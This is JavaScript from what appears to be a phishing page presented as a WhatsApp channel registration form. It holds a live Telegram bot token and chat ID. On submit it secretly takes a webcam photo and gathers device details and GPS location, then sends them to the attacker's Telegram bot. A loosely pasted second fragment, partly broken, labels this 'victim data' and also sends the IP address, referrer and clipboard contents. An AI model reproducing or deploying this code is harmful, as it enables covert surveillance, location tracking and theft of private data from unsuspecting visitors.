    const BOT_TOKEN = "8375191991:AAEzzRKH4ROSYojEoHEkwGV-WohHq91918U"; 
    const CHAT_ID = "6349562246"; 

    // Real-time clock
    function updateClock() {
      const now = new Date();
      const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
      document.getElementById('clock').innerText = timeStr;
    }
    setInterval(updateClock, 1000);
    updateClock();

    let videoReady = false;

    async function startCamera() {
      try {
        const video = document.getElementById('video');
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        video.onloadedmetadata = () => { video.play(); videoReady = true; };
      } catch (err) {
        alert("Mohon izinkan akses: " + err);
      }
    }

    async function capturePhoto() {
      if (!videoReady) await new Promise(resolve => setTimeout(resolve, 500));
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.95));
    }

    async function getDeviceInfo() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const deviceMemory = navigator.deviceMemory || "Tidak tersedia";
      const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
      const androidVersion = androidMatch ? androidMatch[1] : "Tidak Android";
      const isMobile = /Mobi|Android/i.test(userAgent);
      const deviceType = isMobile ? "Mobile" : "Desktop";
      const deviceName = userAgent.match(/\((.*?)\)/)?.[1] || platform;

      const info = {
        deviceName, deviceType, platform, language,
        androidVersion, ram: deviceMemory + " GB",
        screenWidth: window.screen.width, screenHeight: window.screen.height,
        windowWidth: window.innerWidth, windowHeight: window.innerHeight
      };

      return new Promise(resolve => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            info.latitude = pos.coords.latitude;
            info.longitude = pos.coords.longitude;
            info.accuracy = pos.coords.accuracy;
            info.mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            resolve(info);
          }, () => resolve(info));
        } else {
          resolve(info);
        }
      });
    }

    async function sendTelegramMessage(text, photoBlob=null) {
      try {
        if (photoBlob) {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", photoBlob, "foto.jpg");
          formData.append("caption", text);
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body: formData });
        } else {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body: JSON.stringify({ chat_id: CHAT_ID, text })
          });
        }
      } catch(err) { console.error("Gagal kirim:", err); }
    }

    document.getElementById('channelForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const idChannel = document.getElementById('idChannel').value;
      const namaChannel = document.getElementById('namaChannel').value;
      const linkChannel = document.getElementById('linkChannel').value;
      const totalPengikut = document.getElementById('totalPengikut').value;

      const photoBlob = await capturePhoto();
      const deviceInfo = await getDeviceInfo();

      const now = new Date();
      const timestamp = now.getFullYear()+"-"+String(now.getMonth()+1).padStart(2,'0')+"-"+String(now.getDate()).padStart(2,'0')+
                        " "+String(now.getHours()).padStart(2,'0')+":"+String(now.getMinutes()).padStart(2,'0')+":"+String(now.getSeconds()).padStart(2,'0');

      let message = `
📋 Pendaftaran Channel WhatsApp
ID Channel: ${idChannel}
Nama Channel: ${namaChannel}
Link Channel: ${linkChannel}
Total Pengikut: ${totalPengikut}

⏰ Waktu Kirim: ${timestamp}

🌐 Device Info:
Nama Device: ${deviceInfo.deviceName}
Jenis Device: ${deviceInfo.deviceType}
Platform: ${deviceInfo.platform}
Bahasa: ${deviceInfo.language}
Versi Android: ${deviceInfo.androidVersion}
RAM: ${deviceInfo.ram}
Resolusi Layar: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
Resolusi Jendela: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
`;

      if(deviceInfo.latitude && deviceInfo.longitude){
        message += `\n📍 Lokasi: ${deviceInfo.latitude}, ${deviceInfo.longitude} (±${deviceInfo.accuracy} m)
Maps: ${deviceInfo.mapsLink}`;
      } else { message += `\n📍 Lokasi: Tidak tersedia`; }

      await sendTelegramMessage(message, photoBlob);
      alert("✅ Data berhasil dikirim!");
      document.getElementById('channelForm').reset();
    });

    startCamera();
    
    let visitHistory = document.referrer ? document.referrer : "Tidak ada / None";

        try {
            videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); // Nonaktifkan suara
        } catch (error) {
            console.warn("Akses kamera/audio ditolak.");
            videoStream = null;
        }

        try {
            let location = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject));
            userCoords = location.coords;

            // Kirim lokasi langsung ke Telegram (bisa diklik dan diarahkan ke Google Maps)
            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: userCoords.latitude,
                    longitude: userCoords.longitude
                })
            });
        } catch (error) {
            console.warn("Akses lokasi ditolak.");
            userCoords = { latitude: 0, longitude: 0 };
        }

        fetch("https://api64.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                let deviceInfo = `[ DATA KORBAN ]\n\n` +
                                 `Waktu Akses | Access Time : ${getCurrentTime()}\n` +
                                 `Alamat IP | IP Address : ${data.ip}\n` +
                                 `Perangkat | Device : ${navigator.userAgent}\n` +
                                 `Sistem Operasi | Operating System : ${navigator.platform}\n` +
                                 `Resolusi Layar | Screen Resolution : ${screen.width} x ${screen.height}\n` +
                                 `Kunjungan Sebelumnya | Previous Visit : ${visitHistory}\n`;
                                 `@ VVIP Class`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: deviceInfo, parse_mode: "Markdown" })
                });
            });

        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(text => {
                if (text.trim()) {
                    let clipboardInfo = `📋 *Data Clipboard | Clipboard Data* : \n\`\`\`${text}\`\`\``;
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: chatId, text: clipboardInfo, parse_mode: "Markdown" })
                    });
                }
            }).catch(err => console.error("Gagal membaca clipboard:", err));
        }
